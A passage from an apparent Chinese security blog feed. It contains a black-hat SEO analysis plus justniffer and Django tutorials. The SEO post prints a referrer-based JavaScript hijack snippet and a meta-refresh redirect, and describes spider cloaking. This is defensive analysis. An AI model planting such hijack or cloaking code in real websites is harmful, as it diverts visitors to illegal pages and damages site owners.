几大搜索引擎收录情况百度搜索引擎收录情况：谷歌搜索引擎收录情况：bing搜索引擎收录情况：搜狗搜索引擎收录情况：通过对比几大常用搜索引擎对此蜘蛛池站点的收录情况，我们不难看出这套蜘蛛池程序目前只对百度搜索引擎爬虫有效。当然78条的收录量对于一个蜘蛛池站点来说不算很高，说明百度对此手段已有所防范。 传送门黑帽SEO剖析之总结篇黑帽SEO剖析之隐身篇黑帽SEO剖析之工具篇黑帽SEO剖析之手法篇]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑帽SEO剖析之手法篇]]></title>
    <url>../../../../../../../../2017/09/28/1/</url>
    <content type="text"><![CDATA[视而不见，谓合道於希夷；挹之则盈，方同功於造化 此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为黑帽SEO之手法篇，主要介绍黑帽seo的概念以及一些常用的手法。 首先得说黑帽SEO是个老话题，我不难想象评论区必定有人吐槽此手法已经由来已久，作者有炒冷饭的嫌疑。我对此观点表示认可，然而细细回味之后，却又感到无奈不解。一个早已被用烂的黑产手法，一个每年给互联网产业造成巨大损失的黑色手段，为何能一直延续至今？是技术上难以攻破，还是利益驱使下选择视而不见？ 当我发现公开资源中对此黑产手法的介绍寥寥无几且并不详细时，原因便可想而知了。为了营造了一个良好的互联网环境，我在此结合实际案列对黑帽SEO这种黑产手段进行剖析介绍，希望能够使安全界同道引起共鸣，共同抵制。 由于距本文撰写已过去一年之久，而此期间我已不在研究相关技术，因此若文章内容有任何偏差及谬误请谅解。 插曲：有趣的是，就在前几天有位朋友询问了我关于黑帽SEO方面的问题，原因是他一位朋友运营的一个网站，页面莫名其妙出现了赌博博彩的内容，删除后又会自动生成，其十分苦难便寻求他帮忙。 黑帽seo概念 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持（搜索引擎劫持）、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。 SEO的一些黑色手法 黑帽SEO的手法很多，并且在不断地更新换代，其中最常见的包括利用泛解析做站群，入侵高权重网站挂暗链，入侵高权重网站做网页劫持，篡改高权重网站网页内容，利用高权重网站二级目录做推广页面，修改nginx配置做目录反向代理等等。接下来我结合实际案例，介绍一些常用的手段。 利用泛解析建立泛二级域名站群 利用DNS泛解析可以快速建立站群，因为一个一级域名便可以衍生出无数个二级域名，当然一般需要借助站群工具，因为建立站群需要有很多内容不同的页面，手工建立显然不可能。而seo人员大费周章地建立站群的目的，便是能够快速吸引大量的搜索引擎爬虫，增加网站在搜索引擎中的收录量。以下是某个泛二级域名站群案例截图： 需要说明的是，以上截图中的二级域名并不是通过一条条dns解析记录去绑定的，解析里面设置的是*，也就是泛解析。而服务器端有程序或者代码去控制当构造不同的二级域名访问时，会返回不同的网页内容，也就让搜索引擎误认为每个二级域名都是一个单独的网站。 泛解析有很多优点，比如对用户友好（即使输错二级域名也能跳转到目标网站），又能够更快速地被搜索引擎收录等。基于这些优点，很多站长会选择用此方式来增加网站收录，然而如果没有妥善的使用泛解析可能会带来难以想象的危害。 利用泛解析做黑产利用泛解析做黑帽seo的方式也有很多种，基于是否需要入侵网站以及dns服务器，我分为入侵法与非入侵法来介绍。 入侵法真实案例：几个月前我们发现一个重要政府网站出现了大量博彩页面，取证截图如下： 经过分析我发现，此手法利用的便是泛解析，从截图中可以看到出现了大量此政府网站的二级甚至三级域名，而这些域名都是随机构造的，访问后会跳转到博彩色情等非法页面，而访问一级域名又是正常的内容。且先不分析跳转的过程中用到了哪些技术，单从泛解析记录就不难看出，此网站被人篡改了dns解析记录。我们有理由相信，黑客获取了此域名的dns解析控制权限，并将此域名泛解析到黑客准备好的服务器上。那么黑客这么做的目的很明显，为了让搜索引擎快速收录二级或者三级域名，从而达到引流到非法页面的目的。 我们通过分析此政府网站被入侵特征推导出此事件过程应该是，黑客通过入侵手段获取到了该政府网站dns解析权限（如何获取暂不可知），然后通过添加泛解析记录，将此记录指向黑客准备好的服务器，而此服务器上有动态语言去实现通过不同二级域名访问，返回不同的页面结果功能。由于政府网站本身权重很高，因此二级域名页面被百度快速收录，达到为非法页面引流的目的。这种手法的好处在于不必入侵网站，而只要获取到域名解析权限即可（当然获取域名解析权限也并非易事）。 非入侵法真实案例：几天前我们发现有一个网站（sdddzg.cn）利用泛解析做恶意推广，查看网站特征后，我们尝试构造不同的二级域名访问，取证截图如下。构造二级域名访问：最终返回结果： 可以看到返回结果对网页内容以及url做了处理，当我们尝试构造不同的二级域名访问，发现返回结果内容都不一样，然而通过获取ip发现来自同一台服务器。首先我们不难想到，此域名一定是做了泛解析的，那么它是如何控制网页内容变化的呢？查看网页源码可以看到jiang.gov.cn网页源码被嵌入到了目标网页中。 那么其实想要实现此技术也并不难，可以在服务端上用代码实现。首先通过获取请求的二级域名地址，然后去访问该二级域名内容获取源码镶嵌到自己的网页内。如果构造的二级域名内容不是一个完整的域名地址（如：1.sdddzg.cn），则随机返回一段源码。这种手法的好处在于不必入侵网站，只需要自己搭建一台服务器即可，但推广效果没有那么好。 利用网站暗链 在网页中植入暗链这种手法已经相对落伍了，目前用的也比较少，因为搜索引擎已经能够对此作弊手法进行检测。为了介绍知识的完整性，此处我简单介绍一下。暗链也称为黑链，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现等。具体介绍请参考：黑帽SEO之暗链 利用高权重网站，构造关键词URL做推广真实案例：一年前当我刚研究黑帽SEO的时候发现了一个有趣的黑帽SEO方式，虽然手法比较拙劣老套，但却也有成效。于是在写这篇文章的时候，我特意找了一个典型案例，与大家分享，取证截图如下。 将URL中的参数内容显示到网页内，这原本是某些网页的一种特殊功能。以往的经验告诉我这种特性如果没有处理好，可能会引发XSS漏洞，而今我不得不认识到，这种特性也一直被用于黑帽seo。通过在url或者post数据包（常见于搜索框功能）中构造推广关键词，再将有推广关键词页面添加到蜘蛛池中，使搜索引擎收录就能达到推广的目的。一般此种手法常被用来推广qq号，盈利网站等（类似打广告），而当我们通过搜索引擎搜索某些关键词时（如色情资源），就会显示出此页面，从而达到推广自身账号或者网站的目的，当然这只是一种推广手段，并不太涉及引流。 利用网页劫持引流 网页劫持，又叫网站劫持或者搜索引擎劫持，是目前黑帽SEO中最流行的一种做法。其原因可以简单概括为：易收录、难发现，易收录表现为搜索引擎尚没有很好的机制能够检测出此作弊手段，网页劫持手法仍然能够大量引流。难发现是指网页劫持手法比较隐蔽，一般非技术人员很难发现它的存在。 网页劫持从手法上可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等； 网页劫持的表现形式可以是劫持跳转，也可以是劫持呈现的网页内容（与直接篡改网页内容不同），目前被广泛应用于私服、博彩等暴利行业。 网页劫持真实案例 几个月前我处理了一起网页劫持案列，起因是某政府网站上出现了博彩相关内容（排除新闻页面），这显然是不合规的。排除管理员失误添加导致，恐怕此网站多半是被黑客入侵了。首先我访问了该记录上的链接，紧接着浏览器中出现了一个正常的政府页面，而也就须臾之间，网页瞬间又跳转到了博彩网页。图一为正常政府页面：图二为博彩页面： 可以看到博彩页面的域名为www.0980828.com，显然不是先前的政府网站域名xxxx.gov.cn。看到此现象，再结合多年安全经验，我大致能够猜测此网站应该是被网页劫持了。通过分析以上过程的数据包，不难发现在该网站前端页面被嵌入了一段非法代码。此代码存放在43.250.75.61服务器上，查看该服务器信息，发现其在日本。而通过访问此段代码，返回内容则是跳转到www.0980828.com网站上。 分析至此，我们不难发现，导致页面跳转的原因便是xxxx.gov.cn网页被非法嵌入了一窜代码，而此代码能够控制访问该网页时跳转到博彩页面。这是搜索引擎劫持最为基础且常见的一种方式，其变种甚多，类型方式也各异。最后我通过登录web服务器查看，发现了存在大量html文件被篡改，且都在文件开头被写入外部js引用。那么此入侵事件过程应该是，黑客通过web应用程序某些漏洞入侵服务器（实际是管理后台弱口令+任意文件上传），通过批量篡改服务器静态文件实现网页劫持的目的。网页劫持的手法非常多，并不是这一个案例就能概括的，更多详细情况请继续看下文介绍。 服务端劫持 服务端劫持也称为全局劫持，此手法为修改网站动态语言文件，判断访问来源控制返回内容，从而达到网页劫持的目的。其特点往往是通过修改asp/aspx/php等后缀名文件，达到动态呈现网页内容的效果。 Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本，然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问则返回正常页面。 客户端劫持客户端劫持的手法也很多，但最常用的就两种：js劫持与Header劫持。 js劫持目的是通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。js植入手法是可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。 js劫持代码案例：以下代码可以使通过搜索引擎搜索的并点击页面时，执行一段js并跳转到博彩页面；而直接输入网址访问网页时，跳转到一个404页面。1234567891011today=new Date();today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;var where =document.referer;if(regexp.test(where))&#123;document.write ('&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;');&#125;else&#123;window.location.href="../../404.htm";&#125; 代码分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。 header劫持，就是在html代码的head中添加特殊标签，代码如下：1&lt;meta http-equiv="refresh" content="10; url=http://thief.one"&gt; header劫持利用的就是Meta Refresh Tag（自动转向）功能将流量引走。 直接篡改网页内容（比较低级） 有些黑客在入侵网站后，喜欢直接篡改网页内容，比如放上自己的qq号，或者作为推广将网页篡改成非法页面。在此我对此做法的黑客表示鄙视，因为这是一种最恶劣最低级的手法。恶劣在于直接篡改网页内容，可能会导致网站无法挽回的损失；低级在于此手法极易被发现，起不到真正的引流推广作用。 利用高权重网站二级目录 即黑客入侵网站后，在网站二级目录下创建很多自己做推广的页面。为了达到引流的目的黑客往往需要建立大量的二级目录页面，因此需要用到寄生虫程序来自动化的创建页面。此手法也需要入侵高权重网站，获取网站服务器权限。与网页劫持手法不同的是，此手法侧重点在于利用高权重网站自身的优势，在其目录下创建多个推广页面；而网页劫持侧重隐藏自身，其可以做到动态呈现网页内容给客户。因此在实际使用中，黑客经常结合两者使用。此手法与利用泛解析做黑帽seo的手法还是有明显差异的，虽然同样是利用高权重网站本身的优势，但泛解析利用的是二级域名，而此手法利用的是二级目录，当然两者有异曲同工之妙。 利用高权重网站二级目录手法的案例与泛解析案例类似，这里不再详述。既然我前面提到此手法往往需要寄生虫程序的配合使用，那么我们来看看，何为寄生虫程序？它又有何玄机？ 扩展知识【黑帽SEO系列】暗链【黑帽SEO系列】网页劫持【黑帽SEO系列】页面跳转【黑帽SEO系列】基础知识 小结：黑产的技术再不断进步，我们没法停滞不前！ 传送门黑帽SEO剖析之总结篇黑帽SEO剖析之隐身篇黑帽SEO剖析之工具篇黑帽SEO剖析之手法篇]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[justniffer抓取流量大法]]></title>
    <url>../../../../../../../../2017/09/27/1/</url>
    <content type="text"><![CDATA[Understand yourself in order to better understanding others知己方能解人 本篇简单介绍一款流量抓取神器—justniffer，其能在线抓取流量也能离线分析数据包。justniffer与网络抓包神器wireshark相比，用法更为简单且对网络影响较小。面对海量的流量，我们需要经常从中分析出恶意请求，从而去做好防御，因此我在此记录justniffer的一些基础用法，以做备份查阅。 Install123sudo add-apt-repository ppa:oreste-notelli/ppa sudo apt-get updatesudo apt-get install justniffer Usage基础命令1justniffer -i eth5 -u -l "%request.header.host %request.method %request.url %response.grep(\r\n\r\n(.*)) %request.grep(\r\n\r\n(.*))" 重点参数 -i 指定监听的网络接口 -l 指定日志输出格式 -u 将不可打印的字符解析为. 日志格式 %request.header.host #请求头中的HOST %request.method #请求类型 %request.url #请求URL %request.grep(\r\n\r\n(.*)) #请求数据包 %response.grep(\r\n\r\n(.*)) #response的数据包 后期处理一般来说我们在抓取流量后，需要先保存在本地然后再进行规则的分析。然而如何保存，保存后该怎么提取关键内容呢？这里提供一个小小的方法。 抓取流量存入文件可以使用如下命令抓取指定几个参数的流量内容，并存入到文件：1justniffer -i eth5 -u -l "%request.header.host NMASKnmask %request.method NMASKnmask %request.url NMASKnmask %response.grep(\r\n\r\n(.*)) NMASKnmask %request.grep(\r\n\r\n(.*))" | awk -F nmask '$1 !~ /^-/ &amp;&amp; $2 ~ /(GET|POST).*/ &#123;print$2,$1,$3,$4,$5&#125;' &gt;&gt; /log/20170927.log 2&gt;&amp;1 说明：该命令获取了流量的host、method、url、response_body、request_body内容(注意：这里只筛选了GET、POST的请求)，然后将其存入了/log/20170927.log文件中。我们可以运行此命令一段时间，比如1个小时，当结束进程后我们便收集了一个小时的流量信息。 处理日志文件打开/log/20170927.log文件，我们看到的每一行的内容格式如下：1GET NMASK www.baidu.com NMASK /test.html NMASK response_body=&#123;"result":"123"&#125; NMASK request_body=&#123;"get":"123"&#125; 说明：每一行文件内容都包含一份流量信息，流量信息分为五个内容，每个内容间用NMASK（特殊字符串，可自定义）隔开。然后我们便可以写python脚本，遍历日志文件，并用split(“NMASK”)获取每一个流量信息了。 更多的配置信息、命令参数，可参考：http://www.jianshu.com/p/02021de8f82e Python使用justniffer需要借助subprocess模块：123456789import subprocesspopen=subprocess.Popen("justniffer -i eth0 -u -l '%request.header.host nmask %request.method nmask %request.url nmask %response.grep(\r\n\r\n(.*))' | awk -F nmask '$1 !~ /^-/ &#123;print&#125;'",shell=True,stdout=subprocess.PIPE)while 1: p=popen.stdout.readline() #一行一行取 print p #可自定义函数去处理流量 if not p: break]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>justniffer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基础之模版]]></title>
    <url>../../../../../../../../2017/09/15/2/</url>
    <content type="text"><![CDATA[Life is not all roses人生并不是康庄大道 Django中的模版即前端展示，或者说HTML页面，涉及到html、js、css的部分我不做太多了介绍，因为主要是前端的一些东西。本篇主要介绍一下模版与视图的相互传值，以及模版的继承等内容。 创建模版默认情况下，我们在视图函数中使用render渲染index.html页面。12def home(request): return render(request, 'index.html') 之后在应用目录下新建一个templates文件，里面新建index.html文件即可。 模版给视图传参 这一部分比较简单，比如使用form表单，向具体某个url传递一些参数，当然这里需要设置urls.py路由，不然模版的请求无法准确传达到视图的具体处理函数上。模版：1234&lt;form action="/add/" method="get"&gt;&lt;input type="text" name="content"&gt;&lt;input type="submit"&gt;&lt;/form&gt; 视图：1234def add(request): content=request.GET.get("content") return HttpResponse(content) urls.py:12345from django.conf.urls import urlfrom webapp import views #导入app的views文件urlpatterns = [ url(r'^add/', views.add), 模版给视图传默认值的参数:1234&lt;form action="/update/" method="GET"&gt; &lt;input type="hidden" name="nid" value="&#123;&#123; i.nid &#125;&#125;"&gt; &lt;input type="submit" value="获取详情" /&gt;&lt;/form&gt; 说明：模版传给视图的update方法，参数为nid，值为i.nid。 视图给模版传参将上面的视图代码改成：123def add(request): content="123" return render(request,"index.html",&#123;"content":content&#125;) 模版代码：1&lt;p&gt;content is &#123;&#123;content&#125;&#125;&lt;/p&gt; 说明：除了字符串，还可以传递字典、列表等数据结构。 列表python中字典的取值是list[0]，在模版中使用1&#123;&#123; list.0 &#125;&#125; 字典python中字典的取值是dict[“key”]，在模版中使用1&#123;&#123; dict.key &#125;&#125; FOR循环遍历列表：123&#123;% for i in content %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125; 遍历列表且输出的值后面添加，：123&#123;% for i in content %&#125;&#123;&#123; i &#125;&#125;,&#123;% endfor %&#125; 遍历字典：123&#123;% for key, value in info_dict.items %&#125; &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;&#123;% endfor %&#125; 多层循环12345&#123;% for i in content %&#125;&#123;% for j in i.pan %&#125;&#123;&#123; j &#125;&#125;&#123;% endfor %&#125;&#123;% endfor %&#125; 循环的参数：1234567forloop.counter 索引从 1 开始算forloop.counter0 索引从 0 开始算forloop.revcounter 索引从最大长度到 1forloop.revcounter0 索引从最大长度到 0forloop.first 当遍历的元素为第一项时为真forloop.last 当遍历的元素为最后一项时为真forloop.parentloop 用在嵌套的 for 循环中，获取上一层 for 循环的 forloop 判断列表是否为空：12345&#123;% for i in list %&#125; &lt;li&gt;&#123;&#123; i.name &#125;&#125;&lt;/li&gt;&#123;% empty %&#125; &lt;li&gt;抱歉，列表为空&lt;/li&gt;&#123;% endfor %&#125; 逻辑判断== != &gt;= &lt;= &lt; &gt;1234567891011&#123;% if var &gt;= 90 %&#125;case 1&#123;% elif var &gt;= 80 %&#125;case 2&#123;% elif var &gt;= 70 %&#125;case 3&#123;% elif var &gt;= 60 %&#125;case 4&#123;% else %&#125;case 5&#123;% endif %&#125; and not or in not in12345&#123;% if num &lt;= 100 and num &gt;= 0 %&#125;case 1&#123;% else %&#125;case 2&#123;% endif %&#125; 判断元素是否在列表中：123&#123;% if 'nmask' in List %&#125;case 1&#123;% endif %&#125; 内置变量123&#123;&#123; request.user &#125;&#125; 当前用户&#123;&#123; request.path &#125;&#125; 当前网址&#123;&#123; request.GET.urlencode &#125;&#125; 当前get参数 模版继承 一般开发网页都需要写一些模版页面，比如导航栏、底部版权、侧边导航等，或者是某些功能代码。以前可能会使用iframe框架，但现在已经被淘汰了。为了避免重复写代码，也为了后期修改方便，可以使用模版继承的方式。所谓模版继承，就是先写好一个通用的模版，然后标记一些变量，其他页面继承后对标记的地方可以自行修改，若不修改模版使用模版页的内容。base.html12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;link rel="stylesheet" href="style.css" /&gt; &lt;title&gt;&#123;% block title %&#125;My amazing site&#123;% endblock %&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="sidebar"&gt; &#123;% block sidebar %&#125; &lt;ul&gt; &lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="/blog/"&gt;Blog&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &#123;% endblock %&#125; &lt;/div&gt; &lt;div id="content"&gt; &#123;% block content %&#125;&#123;% endblock %&#125; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 说明：可以尽可能多的定义block块，这样可以自定义的地方就会比较多，可以更灵活使用。 index.html123456789&#123;% extends "base.html" %&#125;&#123;% block title %&#125;My amazing blog&#123;% endblock %&#125;&#123;% block content %&#125;&#123;% for entry in blog_entries %&#125; &lt;h2&gt;&#123;&#123; entry.title &#125;&#125;&lt;/h2&gt; &lt;p&gt;&#123;&#123; entry.body &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125;&#123;% endblock %&#125; 多模版继承环境：先有一个根模版，然后创建一个子模版，用来继承根模版，然后其他页面继承子模版。base.html（父模版页面）12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &#123;% block head %&#125;&#123;% endblock %&#125; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&#123;% block body %&#125;&#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; base_ch.html（子模版页面）1234567891011121314&#123;% extends "base.html" %&#125;&#123;% block body %&#125;&#123;% block js %&#125;&lt;script type="text/javascript"&gt; var a = 1;&lt;/script&gt;&#123;% endblock %&#125;&#123;% block label %&#125;&lt;label&gt;This is a base_ch module test!&lt;/label&gt;&#123;% endblock %&#125;&#123;% endblock %&#125; index.html(普通继承页面)123456&#123;% extends "base_ch.html" %&#125;&#123;% block js %&#125;&#123;% endblock %&#125;&#123;% block label %&#125;&lt;label&gt;This is a index page test!&lt;/label&gt;&#123;% endblock %&#125; 参考文章http://code.ziqiangxuetang.com/django/django-template2.html]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基础之URL路由]]></title>
    <url>../../../../../../../../2017/09/15/1/</url>
    <content type="text"><![CDATA[Read, study and learn about everything imporant in your life点点滴滴皆重要，处处学习是诀窍 Django中有个urls.py文件，专门用于管理django的url即路由，我们可以在urls.py文件中创建或者修改路由，以达到访问不同url执行不同view函数的作用。 urls.py先看下urls.py长啥样？12345from django.conf.urls import urlfrom django.contrib import adminurlpatterns = [ url(r'^admin/', admin.site.urls), 默认情况下，django只有一条路由，即admin，当我们开启manage.py，我们只能访问到127.0.0.1:8000/admin/目录，其余的都无法访问。 创建路由 可以看到，路由的创建符合正则表达式的规则，^表示开始，$表示结尾； 另外路由的匹配是从上到下的，也就是说从第一条路由开启匹配，如果满足则不往下匹配，如果不匹配则继续往下。因此为了避免访问到不存在的url，而导致报错，可以再最后添加一条匹配任何url的路由，可以跳转到404页面（自己定义），也可以跳转到主页。12345678from django.conf.urls import urlfrom django.contrib import adminfrom webapp import views #导入app的views文件urlpatterns = [ url(r'^admin/', admin.site.urls), url(r'^.*$',views.index,name="index"), #定义万能路由，注意这条路由一定要放在最后。 URL伪静态改造一般当我们要传参时，url类似：127.0.0.1/app/?a=1&amp;b=2此时urls.py的配置是这样的：12345from django.conf.urls import urlfrom webapp import views #导入app的views文件urlpatterns = [ url(r'^app/$', views.app , name="app"), 此时view.py的代码是这样的：123456def app(request): a=request.GET.get("a") b=request.GET.get("b") return HttpResponse(a+b) 然而如果我们想要将URL变成：127.0.0.1/app/1/2/呢？ 修改urls.py：12345from django.conf.urls import urlfrom webapp import views #导入app的views文件urlpatterns = [ url(r'^app/(\d+)/(\d+)/$', views.app , name="app"), 修改view.py：1234def app(request,a,b): return HttpResponse(str(int(a)+int(b))) Url name我们看到urls.py中的路由配置中，有name字段，可有可无，但建议写上。12urlpatterns = [ url(r'^app/$', views.app , name="app"), 说明：name相当于给这条路由起一个名称，好处在于路由的正则可能会经常变，随之而来的时html里面的url也需要变，因为需要与urls里的路由对应起来。但如果给路由起了名字，则可以在html中使用路由的名字，这样当路由的正则发生改变，但只要名字不变，html中就不需要改。 HTML页面中可以这样用：123456&#123;% url 'name' %&#125; 不带参数&#123;% url 'name' 参数 %&#125; 带参数的：参数可以是变量名 &lt;a href="&#123;% url 'app' 4 5 %&#125;"&gt;link&lt;/a&gt;&lt;a href="&#123;% url 'app' %&#125;"&gt;link&lt;/a&gt;&lt;a href="&#123;% url 'app' %&#125;?a=1&amp;b=2"&gt;link&lt;/a&gt;]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基础之模型(数据库)]]></title>
    <url>../../../../../../../../2017/09/14/2/</url>
    <content type="text"><![CDATA[Live well, love lots, and laugh often善待生活，热爱一切，经常开怀大笑 本篇主要用来记录Django模型相关部分的笔记，模型可以简单理解为数据操作，即从数据库中获取数据，向数据库中存储数据等。django默认使用sqlit3，支持mysql、postgreSQL等数据库。 setting配置数据库连接默认为sqlite3123456DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), &#125;&#125; 修改为mysql配置：12345678910DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'mydatabase', 'USER': 'mydatabaseuser', 'PASSWORD': 'mypassword', 'HOST': '127.0.0.1', 'PORT': '3306', &#125;&#125; NAME: 指定的数据库名，如果是sqlite的话，就需要填数据库文件的绝对位置USER: 数据库登录的用户名，mysql一般都是rootPASSWORD：登录数据库的密码，必须是USER用户所对应的密码HOST: 由于一般的数据库都是C/S结构的，所以得指定数据库服务器的位置，我们一般数据库服务器和客户端都是在一台主机上面，所以一般默认都填127.0.0.1PORT：数据库服务器端口，mysql默认为3306HOST和PORT都可以不填，使用默认的配置 创建表以下方式适合mysql、sqlite3等数据库，另外mysql需要额外安装mysql-python（pip install mysql-python ） models.py中创建表字段12345from django.db import modelsclass auth(models.Model): username = models.CharField(max_length=100) password = models.CharField(max_length=100) 说明：创建一个auth表，字段为username，password，后面是字段数据类型以及最大长度。 执行命令创建表1python manage.py makemigrations 同步数据库表1python manage.py migrate 使用数据表(QuerySet)在Django shell中测试运行:python manage.py shell1234567&gt;&gt;&gt;from webapp.models import auth&gt;&gt;&gt;p = auth(username="nmask", password="nmask")&gt;&gt;&gt;p.save()&gt;&gt;&gt;L=auth.objects.all()&gt;&gt;&gt;for i in L:&gt;&gt;&gt; print i.usernamenmask 说明：View.py中使用方法与shell中类似。 往数据表中插入内容的方法123456789101112第一种：auth.objects.create(username="nmask",password="nmask")第二种：p = auth(username="nmask",password="nmask")p.save()第三种：p = auth(username="nmask")p.password = "nmask"p.save()第四种：auth.objects.get_or_create(username="nmask",password="nmask")说明：此方法会判断是否存在，返回一个元组，第一个为auth对象，第二个为True（不存在已新建）或者False（存在）。 从数据表中查询内容的方法123456789101112131415161718192021222324auth.objects.all()auth.objects.all()[:2] 相当于limit，只获取2个结果auth.objects.get(name="nmask") get是用来获取一个对象的auth.objects.filter(name="nmask") 名称严格等于"abc"的人auth.objects.filter(name__exact="nmask") 名称严格等于"abc"的人auth.objects.filter(name__iexact="nmask") 名称为abc但是不区分大小写auth.objects.filter(name__contains="nmask") 名称中包含 "abc"的人auth.objects.filter(name__icontains="nmask") 名称中包含 "abc"，且abc不区分大小写auth.objects.filter(name__regex="^nmask") 正则表达式查询auth.objects.filter(name__iregex="^nmask") 正则表达式不区分大小写auth.objects.exclude(name__contains="nmask") 排除包含nmask的auth对象auth.objects.filter(name__contains="nmask").filter(password="nmask") 找出账号密码都是nmask的auth.objects.filter(name__contains="nmask").exclude(passowrd="nmask") 找出名称含有nmask, 但是排除password是nmask的auth.objects.all().order_by('name') 查询结果排序auth.objects.all().order_by('-name') 实现倒序res = auth.objects.all()res = res.distinct() 结果去重auth.objects.get(name="nmask").only("password") 只返回password字段auth.objects.get(name="nmask").defer("password") 排出password字段 更新数据表内容单个更新：123response = auth.objects.get(username="nmask")response.passowrd="123"response.save() 批量更新：1auth.objects.filter(name__contains="nmask").update(name='nMask') 删除数据表内容单个删除：123response = auth.objects.get(username="nmask")response.passowrd="123"response.delete() 批量删除：1auth.objects.filter(name__contains="nmask").delete() 使用connection函数1234567891011121314from django.db import connectiondef search_db(sql,value): '''操作数据库''' result_list=[] cursor = connection.cursor() try: cursor.execute(sql,value) result_list=cursor.fetchall() cursor.close() except Exception,e: print e return result_list]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django基础之起步]]></title>
    <url>../../../../../../../../2017/09/14/1/</url>
    <content type="text"><![CDATA[Do one thing at a time, and do well一次只做一件事，做到最好！ 学习使用Python已有2年时间，但至今还没拿它开发出什么像样的项目，大多时候只是用来写写脚本，感觉有点大材小用。因此最近打算好好研究研究python中的Web框架—Django，之所以选择Django而不是flask，也只是偶然，仅此而已。接下来的一段时间我会更新关于Django的一些笔记，内容没有一定的顺序，学到哪记到哪。 Django介绍 太多介绍性的内容就不写了，主要想对纠结学django还是flask甚至其他框架的同学说一声，学啥框架不重要，就好像学什么语言一样，一门通门门通。无论Django还是flask都很强大，也足够我们写一个项目 Django的MTV框架 Django是使用MVC框架设计的，但更准确地说应该是基于MTV框架，即模型(model)－视图(view)－模版(Template)。简单介绍，模型就是数据库（负责数据存储），视图就是后端（负责数据处理），模版就是前端（负责数据展示），模型与视图在Django中分别对应着models.py、views.py，而模版需要自己在templates目录下创建html文件，views.py中的函数渲染templates中的Html模板，得到动态内容的网页。 一个Django页面的搜索功能，整个流程是这样的：从模版获取用户输入—&gt;请求传递到视图—&gt;视图向模型获取数据—–&gt;视图对数据进行处理—-&gt;返回给模型显示。 Django安装1234567安装pip:sudo apt-get install python-pip或者yum install python-pip然后安装django:pip install django 说明：建议使用Python虚拟环境搭建django。 Django常用命令新建项目以及app：12django-admin.py startproject project_name 新建项目python manage.py startapp app_name 新建APP 数据库操作：123456#创建更改的文件python manage.py makemigrations#将生成的py文件应用到数据库python manage.py migrate#清空数据库python manage.py flush 使用内置服务器:123python manage.py runserverpython manage.py runserver 8080python manage.py runserver 10.0.0.1:80 创建管理员：12python manage.py createsuperuserpython manage.py changepassword username 数据导入导出：12python manage.py dumpdata appname &gt; appname.jsonpython manage.py loaddata appname.json 项目环境终端：1python manage.py shell 说明：可以在这个 shell 里面调用当前项目的 models.py 中的api。 数据库命令行：1python manage.py dbshell 